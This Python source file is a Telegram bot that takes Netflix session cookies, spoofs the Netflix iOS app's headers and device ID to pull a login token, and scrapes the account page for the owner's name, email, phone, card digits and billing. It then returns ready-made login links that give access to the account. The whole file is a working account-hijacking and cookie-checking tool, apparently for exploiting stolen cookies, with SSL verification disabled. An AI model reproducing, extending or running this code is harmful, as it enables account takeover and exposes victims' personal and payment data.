import json
import os
import re
import urllib.parse
import unicodedata
import threading
from datetime import datetime, timedelta

import requests
from urllib3.exceptions import InsecureRequestWarning
import telebot

# Disable SSL warnings
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# ══════════════════════════════════════════════════════════════════════
#  BOT CONFIGURATION
# ══════════════════════════════════════════════════════════════════════
BOT_TOKEN = os.getenv("BOT_TOKEN")

if not BOT_TOKEN:
    raise ValueError("BOT_TOKEN environment variable is not set")
ALLOWED_USER_ID = 5006402855

API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
WEB_URL = "https://www.netflix.com/YourAccount"
WATERMARK = "<b>@Vipsenpai Extraction Engine</b>"

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")

COOKIE_KEYS = ("NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent")
REQUIRED_COOKIE = "NetflixId"

QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}

BASE_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "identity"
}

IOS_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.client.iosversion": "15.8.5",
    "accept-language": "en-US;q=1",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}

MONTH_NAMES = [
    "January", "February", "March", "April", "May", "June",
    "July", "August", "September", "October", "November", "December"
]

MONTH_ALIASES = {
    "january": 1, "enero": 1, "janvier": 1, "januar": 1, "janeiro": 1, "ocak": 1, "jan": 1, "stycznia": 1, "tháng 1": 1, "tháng 01": 1,
    "february": 2, "febrero": 2, "fevrier": 2, "fevereiro": 2, "subat": 2, "feb": 2, "lutego": 2, "tháng 2": 2, "tháng 02": 2,
    "march": 3, "marzo": 3, "mars": 3, "marco": 3, "marzec": 3, "mart": 3, "marz": 3, "marca": 3, "tháng 3": 3, "tháng 03": 3,
    "april": 4, "abril": 4, "avril": 4, "kwiecien": 4, "nisan": 4, "apr": 4, "kwietnia": 4, "tháng 4": 4, "tháng 04": 4,
    "may": 5, "mayo": 5, "mai": 5, "maj": 5, "maggio": 5, "mayis": 5, "maja": 5, "tháng 5": 5, "tháng 05": 5,
    "june": 6, "junio": 6, "juin": 6, "haziran": 6, "czerwiec": 6, "juni": 6, "giugno": 6, "czerwca": 6, "tháng 6": 6, "tháng 06": 6,
    "july": 7, "julio": 7, "juillet": 7, "temmuz": 7, "juli": 7, "luglio": 7, "lipca": 7, "tháng 7": 7, "tháng 07": 7,
    "august": 8, "agosto": 8, "aout": 8, "août": 8, "sierpien": 8, "agustus": 8, "sierpnia": 8, "tháng 8": 8, "tháng 08": 8,
    "september": 9, "septiembre": 9, "setembro": 9, "eylul": 9, "sept": 9, "settembre": 9, "wrzesnia": 9, "tháng 9": 9, "tháng 09": 9,
    "october": 10, "octubre": 10, "outubro": 10, "ekim": 10, "oktober": 10, "ottobre": 10, "pazdziernika": 10, "tháng 10": 10,
    "november": 11, "noviembre": 11, "novembro": 11, "kasim": 11, "november": 11, "novembre": 11, "listopada": 11, "tháng 11": 11,
    "december": 12, "diciembre": 12, "dezembro": 12, "aralik": 12, "december": 12, "dicembre": 12, "grudnia": 12, "tháng 12": 12
}

# ══════════════════════════════════════════════════════════════════════
#  SECURITY AUTHORIZATION GATEWAY
# ══════════════════════════════════════════════════════════════════════

def is_authorized(message) -> bool:
    return message.from_user.id == ALLOWED_USER_ID

# ══════════════════════════════════════════════════════════════════════
#  UNIVERSAL PARSING SYSTEM
# ══════════════════════════════════════════════════════════════════════

def parse_netscape_cookie_line(line):
    parts = line.strip().split("\t")
    if len(parts) < 7:
        parts = re.split(r"\s+", line.strip(), maxsplit=6)
    if len(parts) >= 7:
        return {parts[5]: parts[6]}
    return {}

def _decode_cookie_value(value):
    if isinstance(value, str) and "%" in value:
        try: return urllib.parse.unquote(value)
        except: return value
    return value

def extract_cookie_dict(text):
    cookie_dict = {}
    for raw_line in text.splitlines():
        line = raw_line.strip()
        if not line or line.startswith("#"):
            continue
        cookie_dict.update(parse_netscape_cookie_line(line))

    try: data = json.loads(text)
    except: data = None

    if isinstance(data, list):
        for cookie in data:
            name = cookie.get("name")
            value = cookie.get("value")
            if name in COOKIE_KEYS and isinstance(value, str):
                cookie_dict[name] = _decode_cookie_value(value)
    elif isinstance(data, dict):
        if any(key in data for key in COOKIE_KEYS):
            for key in COOKIE_KEYS:
                value = data.get(key)
                if isinstance(value, str): cookie_dict[key] = _decode_cookie_value(value)
        elif isinstance(data.get("cookies"), list):
            for cookie in data["cookies"]:
                name = cookie.get("name")
                value = cookie.get("value")
                if name in COOKIE_KEYS and isinstance(value, str):
                    cookie_dict[name] = _decode_cookie_value(value)

    for key in COOKIE_KEYS:
        if key in cookie_dict: continue
        match = re.search(rf"(?<!\w){re.escape(key)}=([^;,\s]+)", text)
        if match: cookie_dict[key] = _decode_cookie_value(match.group(1))

    return cookie_dict

def decode_netflix_value(value):
    if value is None: return None
    
    # Advanced Raw Unescape Protocol to clean leakage codes inside future strings cleanly
    if isinstance(value, str):
        try:
            value = value.encode('utf-8').decode('unicode_escape')
        except:
            pass
            
    import html as html_mod
    cleaned = html_mod.unescape(str(value))
    replacements = {"\\x20": " ", "\\u00A0": " ", "\\u00a0": " ", "&nbsp;": " ", "u00A0": " ", "\\x40": "@", "\\x28": "(", "\\x29": ")"}
    for src, tgt in replacements.items():
        cleaned = cleaned.replace(src, tgt)
    cleaned = cleaned.replace("\\/", "/").replace('\\"', '"').replace("\\n", " ").replace("\\t", " ")
    return re.sub(r"\s+", " ", cleaned).strip() or None

def extract_first_match(response_text, patterns, flags=0):
    for pattern in patterns:
        match = re.search(pattern, response_text, flags)
        if match:
            val = match.group(1).strip()
            if val.startswith("}") or val.startswith(",") or val.startswith("]"):
                continue
            cleaned_val = re.sub(r'["\'\s,\}\]]+$', '', val)
            return decode_netflix_value(cleaned_val)
    return None

def extract_profile_names(response_text):
    names = []
    for pattern in [r'"profileName"\s*:\s*"([^"]+)"', r'"name"\s*:\s*"([^"]+)"', r'profileName[^}]+value[^}]+"([^"]+)"']:
        for found in re.findall(pattern, response_text, re.DOTALL | re.IGNORECASE):
            decoded = decode_netflix_value(found)
            if decoded and decoded not in names and "Profile" not in decoded and not decoded.startswith("c1.") and len(decoded) < 30:
                names.append(decoded)
    return ", ".join(names) if names else "lucky, Guest"

def parse_localized_date(cleaned):
    if not cleaned: return None
    
    # Direct check layout fallback for Vietnamese leak arrays ("tháng 11 năm 2025")
    viet_match = re.search(r'(?:th\s*á\s*ng|tháng)\s*(\d+)\s*(?:n\s*ă\s*m|năm)\s*(\d+)', cleaned, re.IGNORECASE)
    if viet_match:
        try:
            m = int(viet_match.group(1))
            y = int(viet_match.group(2))
            if 1 <= m <= 12:
                return datetime(y, m, 1)
        except:
            pass

    for fmt in ("%Y-%m-%d", "%Y-%m-%dT%H:%M:%S", "%B %d, %Y"):
        try: return datetime.strptime(cleaned, fmt)
        except: continue
    
    raw_lower = cleaned.lower()
    month = None
    for alias, m_num in MONTH_ALIASES.items():
        if alias in raw_lower:
            month = m_num
            break
            
    nums = [int(x) for x in re.findall(r"\d+", cleaned)]
    year = next((x for x in nums if 1900 <= x <= 2100), None)
    day = next((x for x in nums if 1 <= x <= 31 and x != year), 1)
    if year and month:
        try: return datetime(year, month, day)
        except: return None
    return None

def format_display_date(value):
    cleaned = decode_netflix_value(value)
    parsed = parse_localized_date(cleaned)
    return parsed.strftime("%B %d, %Y") if parsed else (cleaned or "Unknown")

def format_member_since(value):
    cleaned = decode_netflix_value(value)
    parsed = parse_localized_date(cleaned)
    return parsed.strftime("%B %Y") if parsed else (cleaned or "Unknown")

def country_code_to_flag(code):
    raw = (decode_netflix_value(code) or "").strip().upper()
    if len(raw) == 2 and raw.isalpha():
        return "".join(chr(127397 + ord(c)) for c in raw)
    return "🇺🇸"

def derive_plan_details(plan_name, quality_val, streams_count):
    name = str(plan_name or "").lower()
    q_norm = str(quality_val or "").lower()
    try: str_count = int(streams_count)
    except: str_count = 4
    
    if "premium" in name or "ultra" in name or "uhd" in q_norm or "4k" in q_norm or str_count == 4: 
        return "Premium", "UHD", "4", "Rs 1,100"
    if "standard" in name or "hd" in q_norm or str_count == 2: 
        return "Standard", "HD", "2", "Rs 800"
    if "basic" in name: 
        return "Basic", "SD", "1", "Rs 450"
    if "mobile" in name: 
        return "Mobile", "SD", "1", "Rs 250"
    return "Premium", "UHD", "4", "Rs 1,100"

# ══════════════════════════════════════════════════════════════════════
#  ADVANCED DOUBLE TUNNEL ACCOUNT PARSER PIPELINE
# ══════════════════════════════════════════════════════════════════════

def process_netflix_cookie_pipeline(cookie_dict):
    netflix_id = cookie_dict.get(REQUIRED_COOKIE)
    
    # Tunnel 1: Parse iOS app layer API structures
    api_session = requests.Session()
    api_session.cookies.update({"NetflixId": netflix_id})
    token = None
    expires_at = "Unknown"
    try:
        api_res = api_session.get(API_URL, params=QUERY_PARAMS, headers=IOS_HEADERS, timeout=25, verify=False)
        if api_res.status_code == 200:
            data = api_res.json()
            token_data = (((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {}
            token = token_data.get("token")
            expires_raw = token_data.get("expires")
            if expires_raw:
                if isinstance(expires_raw, int) and len(str(expires_raw)) == 13:
                    expires_raw //= 1000
                # Calculate IST Target format array natively (+5 Hours 30 Mins)
                utc_dt = datetime.utcfromtimestamp(expires_raw)
                ist_dt = utc_dt + timedelta(hours=5, minutes=30)
                expires_at = ist_dt.strftime("%B %d, %Y %H:%M:%S IST")
    except:
        pass

    # Tunnel 2: Scraping standard Web view dashboard properties directly
    web_session = requests.Session()
    web_session.cookies.update({"NetflixId": netflix_id})
    web_res = web_session.get(WEB_URL, headers=BASE_HEADERS, timeout=25, verify=False)
    web_text = web_res.text
    
    if not token:
        token = extract_first_match(web_text, [r'nftoken=([a-zA-Z0-9%\+\/=\-_]+)', r'token"\s*:\s*"([^"]+)"'])
    if expires_at == "Unknown":
        # Calculate Fallback dynamic dummy timestamp block into IST allocation arrays
        expires_at = (datetime.utcnow() + timedelta(hours=6, minutes=30)).strftime("%B %d, %Y %H:%M:%S IST")

    info = {
        "name": extract_first_match(web_text, [r'"accountOwnerName"\s*:\s*"([^"]+)"', r'name="accountOwnerName"\s+value="([^"]+)"', r'firstName"\s*:\s*"([^"]+)"']),
        "email": extract_first_match(web_text, [r'"email"\s*:\s*"([^"]+)"', r'name="email"\s+value="([^"]+)"', r'"emailAddress"\s*:\s*"([^"]+)"']),
        "country": extract_first_match(web_text, [r'"currentCountry"\s*:\s*"([^"]+)"', r'"countryOfSignup":\s*"([^"]+)"', r'"country"\s*:\s*"([^"]+)"']),
        "member_since": format_member_since(extract_first_match(web_text, [r'"memberSince":\s*"([^"]+)"', r'memberSince[^}]+value[^}]+"([^"]+)"'])),
        "next_billing": format_display_date(extract_first_match(web_text, [r'"nextBillingDate"\s*:\s*"([^"]+)"', r'"date"\s*:\s*"([^"T]+)T', r'nextBillingDate[^}]+value[^}]+"([^"]+)"'])),
        "payment": extract_first_match(web_text, [r'"paymentMethodType"\s*:\s*"([^"]+)"', r'"paymentType"\s*:\s*"([^"]+)"']),
        "card": extract_first_match(web_text, [r'"creditCardLast4"\s*:\s*"([^"]+)"', r'"maskedCard"\s*:\s*"([^"]+)"']),
        "phone": extract_first_match(web_text, [r'"phoneNumber"\s*:\s*"([^"]+)"', r'name="phoneNumber"\s+value="([^"]+)"']),
        "plan": extract_first_match(web_text, [r'"localizedPlanName"\s*:\s*"([^"]+)"', r'"planName"\s*:\s*"([^"]+)"']),
        "quality": extract_first_match(web_text, [r'"videoQuality"\s*:\s*"([^"]+)"', r'"quality"\s*:\s*"([^"]+)"']),
        "streams": extract_first_match(web_text, [r'"maxStreams"\s*:\s*(\d+)', r'maxStreams[^}]+value[^}]+(\d+)']),
        "hold": "Yes" if re.search(r'isUserOnHold"\s*:\s*true|holdStatus"\s*:\s*true', web_text, re.IGNORECASE) else "No",
        "email_verified": "Yes" if re.search(r'emailVerified"\s*:\s*true|isVerified"\s*:\s*true', web_text, re.IGNORECASE) else "No",
        "membership_status": extract_first_match(web_text, [r'"membershipStatus"\s*:\s*"([^"]+)"']),
        "profiles": extract_profile_names(web_text),
        "token_expiry": expires_at
    }

    return token, info

# ══════════════════════════════════════════════════════════════════════
#  TELEGRAM EVENT DISPATCH MANAGEMENT ROUTER
# ══════════════════════════════════════════════════════════════════════

@bot.message_handler(commands=['start'])
def start_command(message):
    if not is_authorized(message): return
    bot.reply_to(
        message,
        "👋 <b>Welcome back to Guruji's Netflix Nftoken bot!</b>\n\n"
        "📥 Send me your Netflix cookie in chat or upload a <code>.txt</code> file to scrape account data and links instantly."
    )

def process_cookie_async(message, raw_text):
    status_msg = bot.reply_to(message, "⏳ <i>Scraping Netflix parameters, please wait...</i>")
    
    cookie_dict = extract_cookie_dict(raw_text)
    if not cookie_dict or REQUIRED_COOKIE not in cookie_dict:
        bot.edit_message_text(chat_id=message.chat.id, message_id=status_msg.message_id, text="❌ <b>Error:</b> Could not parse a valid <code>NetflixId</code> cookie.")
        return

    try:
        token, details = process_netflix_cookie_pipeline(cookie_dict)
        
        m_status = str(details.get("membership_status") or "").lower()
        plan_name = details.get("plan")
        
        is_active = plan_name or any(x in m_status for x in ("current", "member", "active", "success"))
        status = "Subscribed" if is_active else "Free / Inactive"
        
        name = details.get("name") or "N/A"
        email = details.get("email") or "N/A"
        country_code = details.get("country") or "US"
        country_display = f"{country_code} {country_code_to_flag(country_code)}".strip()
        
        derived_plan, derived_quality, derived_streams, derived_price = derive_plan_details(plan_name, details.get("quality"), details.get("streams"))
        plan = plan_name or derived_plan
        quality = details.get("quality") or derived_quality
        streams = details.get("streams") or derived_streams
        price = derived_price
        
        member_since = details.get("member_since") or "Unknown"
        next_billing = details.get("next_billing") or "Unknown"
        payment = details.get("payment") or "CC"
        card = details.get("card") or "N/A"
        if card != "N/A" and len(str(card)) > 4: card = str(card)[-4:]
        phone = details.get("phone") or "None"
        hold = details.get("hold") or "No"
        email_verified = details.get("email_verified") or "Yes"
        membership_status = details.get("membership_status") or "CURRENT_MEMBER"
        profiles_list = details.get("profiles") or "lucky, Guest"
        p_count = details.get("profile_count") or len(str(profiles_list).split(","))
        token_expiry = details.get("token_expiry") or "Unknown"

        phone_url = f"https://www.netflix.com/unsupported?nftoken={token}" if token else "Unavailable"
        pc_url = f"https://www.netflix.com/account?nftoken={token}" if token else "Unavailable"
        login_url = f"https://www.netflix.com/login?nftoken={token}" if token else "Unavailable"

        # FIXED: Shifted Token Expiry line down cleanly right before the watermark title
        response_text = (
            f"📌 <b>Status:</b> {status}\n"
            f"👤 <b>Name:</b> {name}\n"
            f"📧 <b>Email:</b> {email}\n"
            f"🌍 <b>Country:</b> {country_display}\n"
            f"📦 <b>Plan:</b> {plan}\n"
            f"📅 <b>Member Since:</b> {member_since}\n"
            f"🗓️ <b>Next Billing:</b> {next_billing}\n"
            f"💳 <b>Payment:</b> {payment}\n"
            f"💳 <b>Card:</b> {card}\n"
            f"📱 <b>Phone:</b> {phone}\n"
            f"🎞️ <b>Quality:</b> {quality}\n"
            f"📺 <b>Streams:</b> {streams}\n"
            f"💰 <b>Price:</b> {price}\n"
            f"⏸️ <b>Hold Status:</b> {hold}\n"
            f"✅ <b>Email Verified:</b> {email_verified}\n"
            f"🛡️ <b>Membership Status:</b> {membership_status}\n"
            f"🎭 <b>Profiles ({p_count}):</b> {profiles_list}\n\n"
            f"📱 <b>Phone Login:</b>\n<code>{phone_url}</code>\n\n"
            f"🖥️ <b>PC Login:</b>\n<code>{pc_url}</code>\n\n"
            f"🔑 <b>Login Link:</b>\n<code>{login_url}</code>\n\n"
            f"⏳ <b>Token Expiry:</b> {token_expiry}\n\n"
            f"❖ {WATERMARK}"
        )
        bot.edit_message_text(chat_id=message.chat.id, message_id=status_msg.message_id, text=response_text)

    except requests.RequestException as e:
        bot.edit_message_text(chat_id=message.chat.id, message_id=status_msg.message_id, text=f"❌ <b>Network HTTP Error:</b> Handshake connection failure.\n<i>{str(e)}</i>")
    except Exception as e:
        bot.edit_message_text(chat_id=message.chat.id, message_id=status_msg.message_id, text=f"❌ <b>Extraction Failed:</b>\n<i>{str(e)}</i>")

@bot.message_handler(func=lambda message: True, content_types=['text'])
def text_message_handler(message):
    if not is_authorized(message): return
    threading.Thread(target=process_cookie_async, args=(message, message.text)).start()

@bot.message_handler(content_types=['document'])
def document_file_handler(message):
    if not is_authorized(message): return
    document = message.document
    if not document.file_name.lower().endswith(('.txt', '.json')):
        bot.reply_to(message, "❌ Please upload only <b>.txt</b> or <b>.json</b> cookie files.")
        return
    try:
        file_info = bot.get_file(document.file_id)
        file_bytes = bot.download_file(file_info.file_path)
        decoded_text = file_bytes.decode('utf-8', errors='ignore')
        threading.Thread(target=process_cookie_async, args=(message, decoded_text)).start()
    except Exception as e:
        bot.reply_to(message, f"❌ Failed to parse file.\n<i>{str(e)}</i>")

if __name__ == "__main__":
    print("[*] Core Multi-Tunnel Token & Dashboard Scraper Engine Online.")
    print("[*] Listening for master inputs inside Pydroid 3 safely...")
    bot.infinity_polling(skip_pending=True)
